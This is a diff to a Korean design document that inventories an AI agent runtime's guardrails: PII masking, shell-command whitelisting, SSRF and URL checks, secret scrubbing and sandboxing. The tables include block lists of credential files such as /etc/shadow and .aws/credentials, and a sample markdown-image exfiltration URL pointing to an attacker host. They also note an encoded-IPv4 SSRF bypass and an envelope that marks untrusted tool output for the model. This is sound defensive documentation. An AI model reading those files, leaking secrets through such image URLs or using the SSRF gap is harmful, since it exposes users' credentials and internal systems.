@@ -240,13 +240,17 @@ def approval_cb(command: str, description: str = "") -> str:   # 위치 인자 �
 
 ### 2.1 값 탐지 → 마스킹 축
 
-| 이름 | 위치 (LOC) | 하는 일 |
-|---|---|---|
-| `pii_filter` | `guardrails/{recognizer,detector,filter}.rs` + `handwritten/` (≈4.3k) | `regex-automata` lazy DFA + `aho-corasick`. **인식기 49종** — 카드·주민번호·여권·계좌·전화 + GitHub ×7, AWS ×2, Stripe ×2, Slack ×5, GCP/Google ×5, Square ×2, Facebook ×2 등 |
-| `SensitiveDetector` 트레잇 | `tinicore-traits/src/sensitive.rs` | 워크스페이스 `impl` **30개 중 실제 탐지 구현은 `PiiSpanDetector` 하나**(`guardrails/detector.rs:475`). 29개는 테스트 더블이며 그중 `extractor/mock.rs:165`는 `cfg(test)` 게이트 없이 프로덕션에 포함 |
-| `DetectorChain` | `sensitive/chain.rs` (792) | 마스킹은 `detect_all`, **차단은 `detect_any_of`**(`sensitive/guardrail.rs:143`). `detect_any`도 있으나 차단엔 미사용 |
-| redaction vault | `sensitive/redaction.rs` (1846) | 마스킹↔복원 라운드트립 |
-| `sensitive_masking` | `agent/pii_masking.rs` (3852) | LLM 송신 직전 마스킹 (`EgressMask`) |
+| 이름 | 검사 대상 | 탐지 방식 | 조치 |
+|---|---|---|---|
+| `pii_filter`<br>`guardrails/{recognizer,detector,filter}.rs` + `handwritten/` (≈4.3k) | **임의 텍스트**, 레이어별로 다른 인식기 집합 적용(`input`/`output`/`default`) | **인식기 49종** — 카드·주민번호·여권·계좌·전화 + GitHub ×7, AWS ×2, Stripe ×2, Slack ×5, GCP/Google ×5, Square ×2, Facebook ×2 등. `regex-automata` lazy DFA(청크 컴파일) + `aho-corasick` 두 엔진을 `MatchEngine` 뒤에 두고, 매치 후 boundary check → 체크섬 검증(Luhn·주민번호·전화) → 중복 제거 → 문맥어 스코어링 | **탐지만 한다** — `analyze()`가 `Vec<PiiMatch>`(바이트 스팬 + 종류)를 반환(`filter.rs:126`). 별도로 `mask()`(`:180`)가 있으나 `deidentifier_enable`이 꺼져 있으면 원문 그대로 반환. 실제 차단·마스킹 결정은 아래 층이 한다 |
+| `SensitiveDetector` (트레잇)<br>`tinicore-traits/src/sensitive.rs` | — (계약) | 워크스페이스 `impl` **30개 중 실제 탐지 구현은 `PiiSpanDetector` 하나**(`guardrails/detector.rs:475`) | 나머지 29개는 테스트 더블. 그중 `extractor/mock.rs:165`는 `cfg(test)` 게이트 없이 프로덕션 빌드에 포함됨 |
+| `DetectorChain`<br>`sensitive/chain.rs` (792) | 탐지기 N개에 넘길 텍스트 | 소비자에 따라 순회가 다르다 — **마스킹은 `detect_all`**(전원 통과, 스팬 합집합: 한 탐지기가 놓친 스팬은 곧 유출이므로 조기 종료 불가), **차단은 `detect_any_of`**(kind 지정, 해당 kind 첫 히트에서 중단 — `sensitive/guardrail.rs:143`) | 소비자에게 `ChainOutcome` 전달. `detect_any`도 존재하나 차단 경로엔 쓰지 않는다(`chain.rs:214-231`이 이유를 설명: 저비용 탐지기가 전화번호를 먼저 찾으면 credential 히트를 가림) |
+| redaction vault<br>`sensitive/redaction.rs` (1846) | 탐지된 스팬을 담은 텍스트 | 스팬을 자리표시자로 치환하고 원값을 볼트에 보관 | **가역 마스킹** — LLM 왕복 후 복원까지 왕복 계약을 보장. 자유 함수로 구현해 엔진이 볼트 계약에 손댈 수 없게 막음 |
+| `sensitive_masking`<br>`agent/pii_masking.rs` (3852) | **LLM으로 나가는 텍스트**(`MaskRoles`로 역할 선택) 및 모델이 낸 출력(`mask_llm_output`) | 주입된 `DetectorChain`으로 스팬 탐지. `PiiSpanDetector`를 직접 언급하지 않고 `Arc<dyn SensitiveDetector>`로만 받음 | 송신 직전 스팬 치환(`EgressMask`). `demask_tool_args`로 지정된 툴의 인자는 실행 직전 원값 복원 |
+
+> **이 축의 구조**: `pii_filter`는 **탐지기**, `sensitive/*`는 **파이프라인**, `pii_masking`은
+> **적용 지점**이다. 파이프라인은 `sensitive` feature로 기본 컴파일되지만 유일한 실제 탐지기가
+> `guardrails` feature 안에 있어, 기본 빌드에서는 기계장치만 있고 탐지가 0건이다(§4).
 
 ### 2.2 콘텐츠 스캔 축
 
@@ -267,42 +271,44 @@ def approval_cb(command: str, description: str = "") -> str:   # 위치 인자 �
 
 ### 2.3 툴 호출 게이트 축
 
-| 이름 | 위치 (LOC) | 하는 일 |
-|---|---|---|
-| `arg_shape` (G1) | `guardrails_tool_input/mod.rs` (2554) | 카탈로그 밖 툴명·필수 인자 누락 |
-| `command_safety` (G2) | 〃 (1859) | **argv 파싱 화이트리스트**. `UNCONDITIONALLY_SAFE:56`, `FIND_UNSAFE:64`, `GIT_UNSAFE_GLOBAL:88`, `REJECTED_SHELL_CHARS:145`. Safe/Dangerous/**Unknown** 3상태 |
-| `secret_path` (G3) | 〃 (573) | **모든 툴 인자**에서 민감 경로. `.ssh`(단 `known_hosts`, `known_hosts.old`, `config`, `authorized_keys` 예외), `.aws/credentials`, `.kube/config`, `.docker/config.json`, `.gnupg` |
-| `path_boundary` (G4) | 〃 (407) | 쓰기 대상 허용 루트 이탈 |
-| `path_validator` | `security/path_validator.rs` (1063) | 심볼릭 링크 해석 + **하드코딩 블록리스트**(`BLOCKED_SUBSTRINGS:43`): `/etc/shadow`, `/.ssh/`, `/.gnupg/`, `/.aws/credentials`, `/.netrc`, `/.docker/config.json`, `/.kube/config` 등. **예외 없음** |
-| `confine` | `security/confine.rs` (667) | 앵커 이탈 경로 거부 |
+| 이름 | 검사 대상 | 탐지 방식 | 조치 |
+|---|---|---|---|
+| `arg_shape` (G1)<br>`guardrails_tool_input/mod.rs` (2554) | **툴 이름 + 파싱된 인자**, `CapabilityBroker` 통과 후 툴 본문 실행 전 | 호스트 공급 `ToolInputPackConfig`의 allow/deny 목록과 인자 형태 대조 — 카탈로그 밖 툴명, 필수 인자 누락 | tripwire → 툴 실행 안 함. 결과에 가드레일 메시지가 에러로 실림 |
+| `command_safety` (G2)<br>〃 (1859) | **셸 명령의 argv** (`bash -lc "…"` 같은 래핑을 풀어낸 뒤) | **화이트리스트 + argv 파서**. `UNCONDITIONALLY_SAFE:56` 목록, 바이너리별 위험 플래그 테이블(`FIND_UNSAFE:64`, `GIT_UNSAFE_GLOBAL:88`), 셸 메타문자 거부(`REJECTED_SHELL_CHARS:145`), `sudo`/`env` 래퍼 분해(`:556`) | **Safe / Dangerous / Unknown 3상태.** Dangerous는 무조건 거부. **`Unknown`(안전 증명 실패)의 처분은 `EscalateAction` 설정에 달림** — `Ask`(기본, 사람에게 에스컬레이션) / `Block`(무인 실행용 즉시 거부) / **`Allow`(통과)** (`:72`, `:663`) |
+| `secret_path` (G3)<br>〃 (573) | **모든 툴 인자에서 추출한 경로** (G3 "위험 인자" 검사군의 한 하위 검사) | 파일명·확장자·디렉터리+파일 쌍 목록 대조. `.ssh` 전체(단 `known_hosts`, `known_hosts.old`, `config`, `authorized_keys`는 **비밀 아님으로 예외**), `.aws/credentials`, `.kube/config`, `.docker/config.json`, `.gnupg` | tripwire → 읽기 차단 |
+| `path_boundary` (G4)<br>〃 (407) | **쓰기 대상 경로** | 호스트가 지정한 쓰기 가능 루트를 벗어나는지 판정 | Safe/Dangerous/**Unverifiable** — 미검증분은 G2와 같은 `EscalateAction` 처분을 따름 |
+| `path_validator`<br>`security/path_validator.rs` (1063) | **파일 계열 빌트인이 넘긴 `path` 인자** — `file_read`/`file_list`/`file_open`/`file_search`/`document_*`/`docx_edit`/`ocr`/`powershell_*` (빌트인 12개). **`bash`는 이 경로를 안 탄다** | 경로를 정규화(심볼릭 링크 해석)한 뒤 **하드코딩 블록리스트** 대조 — `BLOCKED_SUBSTRINGS:43`에 `/etc/shadow`, `/etc/passwd`, `/etc/sudoers`, `/.ssh/`, `/.gnupg/`, `/.aws/credentials`, `/.netrc`, `/.docker/config.json`, `/.kube/config` 등. **예외 없음**(G3와 달리 `known_hosts`도 차단) | `PathValidationError`로 툴 진입 거부. 통과 시 정규 경로를 `reauthorize_canonical_in_scope`에 넘겨 스코프 재확인 |
+| `confine`<br>`security/confine.rs` (667) | **호출자가 준 경로 + 앵커(루트)** — 호스트의 `file_write`/`file_edit`/`file_delete`(LLM이 준 경로)와 `quickjs_hand`의 `api.fs.*` 바인딩이 공유 | 경로를 앵커 아래 실제 파일시스템으로 매핑하며 이탈 여부 판정. 워크스페이스에서 "신뢰할 수 없는 경로를 루트 아래로 해석"하는 **유일한 구현**(CLAUDE.md § Canonical homes) | `resolve()`가 이탈 시 `Err(String)` — 매핑 자체를 거부 |
 
 ### 2.4 네트워크 축
 
-| 이름 | 위치 (LOC) | 하는 일 |
-|---|---|---|
-| `ssrf` | `security/ssrf.rs` (691) | `reject_ssrf_target`(`:48`) + `reject_ssrf_resolved`(`:188`, **`tokio::net::lookup_host`로 DNS 해석 후 재검사**). CGNAT·benchmark + **IPv4-mapped/compat IPv6 재분류**(`:134`) |
-| `url_validator` | `security/url_validator.rs:65` (328) | `validate_outbound_url`. 모듈 주석: "LLM이 준 URL을 다루는 모든 빌트인은 이걸 통과해야 함" |
-| `network_policy` | `security/network_policy.rs` (1089) | `validate_domain`(도메인 allowlist) + `is_private_or_local`(사설망 판정). **둘의 활성화 상태가 다르다**(§4) |
-| `url_scan` | `guardrails_exfil/url_scan.rs` (1377) | `UrlContext::AutoFetched` 기반 **제로클릭 마크다운 이미지 유출** 탐지 |
-| `secret_needles` | `guardrails_exfil/secret_needles.rs` (271) | env 시크릿 **값** 유출 경보 |
+| 이름 | 검사 대상 | 탐지 방식 | 조치 |
+|---|---|---|---|
+| `ssrf`<br>`security/ssrf.rs` (691) | **아웃바운드 요청의 호스트 문자열** — 브라우저 툴은 리다이렉트 후 최종 URL도 재검사 | 2단계. `reject_ssrf_target`(`:48`)은 loopback 호스트명 + 리터럴 IP 분류, `reject_ssrf_resolved`(`:188`)는 **`tokio::net::lookup_host`로 DNS 해석 후 재검사**. 커버: loopback/RFC1918/link-local/CGNAT/multicast/benchmark + **IPv4-mapped·compat IPv6 재분류**(`:134`). 모듈 주석이 인정하는 한계: 십진·16진·8진 인코딩 IPv4(`http://2130706433/`)와 4파트 미만 축약형은 통과 | `Option<&'static str>` 반환 — `Some(사유)`면 호출 툴이 요청을 거부 |
+| `url_validator`<br>`security/url_validator.rs:65` (328) | **LLM이 제시한 아웃바운드 URL** — `http_fetch`/`http_post`/`brave_search`/`desktop_web`/`document_read` | 스킴·호스트 파싱 후 `network_policy::is_private_or_local`(`:87`)로 사설망 판정 위임 | `Result<(), String>` — `Err`면 호출 툴이 거부. 모듈 주석: "LLM이 준 URL을 다루는 모든 빌트인은 이걸 통과해야 함" |
+| `network_policy`<br>`security/network_policy.rs` (1089) | 두 갈래 — **① 도메인**(`validate_domain`, 스킬이 선언한 허용 도메인) **② 호스트/IP 문자열**(`is_private_or_local`) | 순수 함수(비동기·IO 없음). ①은 glob 패턴 매칭(`domain_matches_pattern`), ②는 사설·로컬 대역 판정 | **둘의 활성화 상태가 다르다**(§4) — ②는 `url_validator`를 통해 항상 도는 반면, ①은 `tinish` 샌드박스 셸 경로에만 있어 데스크톱 기본(`ShellMode::System`)에서는 안 돈다 |
+| `url_scan`<br>`guardrails_exfil/url_scan.rs` (1377) | **모델이 낸 출력 / 툴이 돌려준 텍스트** 안의 URL | 마크다운·HTML·맨URL 형태를 손수 스캔해 `FoundUrl{url, context}` 추출. 핵심은 `UrlContext` 구분 — **`AutoFetched`**(`![](…)`, `<img src=…>`: 렌더러가 **클릭 없이** 가져감) vs `Link`(클릭 필요). URL 추출은 보수적, 의심 판정은 관대하게 | 제로클릭 유출 채널(`![](https://attacker/leak?d=<secret>)`) 또는 비허용 호스트 링크를 tripwire. 가드레일 메타데이터에 URL을 실을 때는 `security::url_redact::redact_url_secrets`를 거쳐 **경보 자체가 유출이 되지 않게** 함 |
+| `secret_needles`<br>`guardrails_exfil/secret_needles.rs` (271) | **모델 출력 / 툴 결과 텍스트** | 프로세스가 이미 들고 있는 env 시크릿 **값 자체**를 needle로 삼아 부분문자열 매칭(카나리 토큰도 동일 취급). needle 자격을 엄격히 거름 — 너무 짧거나(8자 `hunter2`도 탈락), 공백 포함, `changeme`/`localhost` 같은 placeholder, 한 글자 반복은 제외 | 등장 시 tripwire(**경보**). `scrubber`가 조용히 치환하는 것과 역할 분담 — 모듈 주석 표현으로 "스크러버는 청소, 이건 알람" |
 
 ### 2.5 시크릿 관리 축
 
-| 이름 | 위치 (LOC) | 하는 일 |
-|---|---|---|
-| `scrubber` | `tools/scrubber.rs` (956) | 툴 출력 3패스(`:42`→`:213`→`:417`): env 시크릿 **값** 치환 → base64 축약 → 크기 상한. `collect_env_secrets`(`:470`)는 `len>=8 && (KEY\|SECRET\|TOKEN\|PASSWORD)` |
-| `output_scrubber` | `security/output_scrubber.rs` (279) | 심층 방어 스크럽 |
-| `credential_proxy` | `security/credential_proxy.rs` (1000) | 실행 직전 시크릿 주입 **[코드확인]** |
-| `secret_scope`/`tracker`/`ref`/`vault` | `security/` (합 1752) | 툴별 접근 범위, 접근 횟수 이상 탐지, 참조 전달, 파일 볼트 |
+| 이름 | 검사 대상 | 탐지 방식 | 조치 |
+|---|---|---|---|
+| `scrubber`<br>`tools/scrubber.rs` (956) | **모든 툴의 실행 결과** — 텍스트 `output`과 구조화된 `data` 양쪽 (`data`만으로 우회하지 못하게) | 3패스 순차 적용: ① `collect_env_secrets`(`:470`)가 모은 env 값 부분문자열 매칭 — 조건은 `len >= 8 && 키 이름에 KEY\|SECRET\|TOKEN\|PASSWORD` ② base64 형태 덩어리 탐지(1000자 초과) ③ 바이트 크기 초과 | ① 시크릿 값 **치환** ② 크기 자리표시자로 **축약** ③ **절단**. 조용히 수행하며 차단하지 않음 |
+| `output_scrubber`<br>`security/output_scrubber.rs` (279) | **스킬 실행이 stdout/stderr로 뱉은 출력** — VFS·env에서 시크릿을 지운 뒤에도 스크립트가 echo할 수 있으므로 | 알려진 시크릿 **값** 문자열 매칭 | `[SENS:CRED:KEY_NAME]` 토큰으로 치환. `SkillSandbox`의 구성요소로 들어감 |
+| `credential_proxy`<br>`security/credential_proxy.rs` (1000) | **툴 실행 직전의 자격증명 참조** (`ToolOrchestrator` → `CredentialProxy` → `Hand` 사이) | 볼트 키 기반 `SecretStore.get(ref)` + OAuth `TokenStore`/`OAuthFlowDriver` 조회 | 마지막 순간에만 실값 주입 — **hand(실행 환경)는 원본 토큰을 보지 못한다.** 실패는 `CredentialProxyError` |
+| `secret_scope`<br>`security/secret_scope.rs` (495) | **툴/스킬이 요청한 시크릿 키** + 스킬 설치 시점의 보안 매니페스트 | `SecretScope`가 툴별 허용 키 목록 보유. `NativeBridge`가 값을 돌려주기 전 대조. 부수적으로 `TrustTier`(Certified/User/Untrusted), `SkillSecretManifest`, 설치 시 정적 분석(`validate_skill_install`) | 범위 밖 키 요청 거부. 설치 분석 결과는 `SecurityWarning`으로 |
+| `secret_tracker`<br>`security/secret_tracker.rs` (178) | **스킬 1회 실행 중의 시크릿 읽기 횟수** (스킬별·키별 카운터) | `record_access(skill_id, key)`가 누적, 임계 초과 판정 | `SecurityWarning::HighFrequencyAccess` 발생(경보). 차단이 아니라 이상 신호. 실행 종료 시 `reset(skill_id)` 필요 |
+| `secret_ref` / `secret_vault`<br>`security/` (530 + 549) | 시크릿 값 대신 오가는 **참조**, 그리고 파일 백업 볼트 | 값 대신 참조를 전달해 평문이 로그·프롬프트에 노출될 표면을 줄임 | 값 해석은 `credential_proxy`가 마지막 단계에서만 |
 
 ### 2.6 실행 격리 축
 
-| 이름 | 위치 (LOC) | 하는 일 |
-|---|---|---|
-| `SkillSandbox` | `security/sandbox.rs` (1512) | 스킬 실행 통합 진입점 |
-| `ExecSandbox` | `tinicore-traits/src/exec_sandbox.rs` | OS 격리 계약 |
-| `integrity` | `security/integrity.rs` | 인증 스킬 SHA-256 변조 탐지 |
-| `untrusted_envelope` | `execution.rs` `post_execute`(`:3539`), 판정 `:3568` | 미등록/외부 툴 결과를 "신뢰 불가"로 태깅. **fail-closed** — `tool_def.is_none_or(|d| d.trust_tier == TrustTier::Untrusted)` |
+| 이름 | 검사 대상 | 탐지 방식 | 조치 |
+|---|---|---|---|
+| `SkillSandbox`<br>`security/sandbox.rs` (1512) | **스킬 실행 전체** — 모든 스킬 실행의 단일 진입점 | 네 가지를 묶은 통합 계층: `ScopedVFS`(쓰기를 스킬 자기 디렉터리·`/tmp/`·`/run/secrets/`로 제한), `SecretAccessTracker`, `OutputScrubber`, 실행별 감사 로그 | 네임스페이스 밖 쓰기 거부 + 시크릿 이상 접근 경보 + 출력 스크럽 + 구조화 이벤트 기록 |
+| `ExecSandbox`<br>`tinicore-traits/src/exec_sandbox.rs` | **에이전트가 띄우는 서브프로세스** | OS 격리 계약(트레잇). 호스트가 플랫폼별 구현 제공 | 격리 적용 후 실행. CLAUDE.md는 사이트별 `sandbox-exec`/`unshare`/`setrlimit` 직접 호출을 금지하고 이 경로만 쓰게 함 |
+| `integrity`<br>`security/integrity.rs` | **`Certified` 등급 스킬의 소스 내용** | 설치 시 SHA-256 해시를 매니페스트 옆에 저장, **실행 전마다 재해시해 비교** | 불일치 시 `SecurityWarning::TamperedCertifiedSkill` |
+| `untrusted_envelope`<br>`execution.rs` `post_execute`(`:3539`), 판정 `:3568` | **모든 툴 결과의 출처 등급** | `tool_def.is_none_or(\|d\| d.trust_tier == TrustTier::Untrusted)` — 레지스트리에 정의가 **없는** 툴(외부 AIDL 앱, 웹, 서드파티)도 Untrusted로 간주하는 **fail-closed** | 차단이 아니라 **태깅**. 결과를 프롬프트 격리 봉투로 감싸 LLM에게 "이건 신뢰할 수 없는 출처"라고 알림. 봉투 헤더에 들어가는 툴 이름은 `defuse_markers` + 헤더 문자 필터를 거쳐 구조 바이트 밀반입을 막음 |
 
 ### 2.7 위 표에 없는 관련 모듈
 
@@ -532,3 +538,4 @@ sed -n '87,111p' ~/Works/argo-tizen/crates/argot-daemon/src/agent_config.rs  # P
 | 9 | §2.2에 `audit_text` **이력·설계 스코프** 추가 | `97f73caa5c`(2026-06-01), 룰 무변경, "one pre-registration audit" |
 | 10 | §2.2를 **"검사 대상 → 탐지 방식 → 조치"** 3열 구조로 재작성 | 요청 반영 |
 | 11 | `static_scan`이 **호출자 0건**임을 발견 — §2.2에 경고, §4.1에 `OFF(미배선)` 행 추가 | `grep -rn "static_scan\|scan_js\|scan_py\|StaticScanHit"` 결과가 `security/mod.rs:18` 모듈 선언 하나뿐 |
+| 12 | **§2 인벤토리 전체(2.1~2.6)를 "검사 대상 → 탐지 방식 → 조치" 3열로 통일** | 요청 반영. 이 과정에서 확인된 사항: `pii_filter`는 **탐지만** 하고 조치는 상위 층 몫(`filter.rs:126` `analyze` → `Vec<PiiMatch>`), `path_validator`(예외 없음)와 G3 `secret_path`(`known_hosts` 예외)의 **엄격도가 반대**, `secret_needles`는 경보이고 `scrubber`는 조용한 치환이라 역할이 분담됨 |
